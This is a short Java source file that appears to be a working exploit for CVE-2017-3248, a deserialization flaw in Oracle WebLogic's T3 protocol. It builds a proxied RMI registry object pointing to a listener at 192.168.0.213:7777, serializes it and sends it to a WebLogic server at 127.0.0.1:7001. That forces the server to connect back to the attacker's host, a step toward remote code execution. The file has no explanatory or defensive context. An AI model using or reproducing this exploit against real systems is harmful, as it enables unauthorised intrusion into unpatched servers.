package main;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class cve_2017_3248 {
    public Object getObject(){
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint("192.168.0.213", 7777);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(cve_2017_3248.class.getClassLoader(), new Class[]{
                Registry.class
        }, obj);
        return proxy;
    }
    public static void main(String[] args) throws Exception {
        Object obj = new cve_2017_3248().getObject();
        byte[] payload2 = Serializables.serialize(obj);
        T3ProtocolOperation.send("127.0.0.1", "7001", payload2);
    }
}
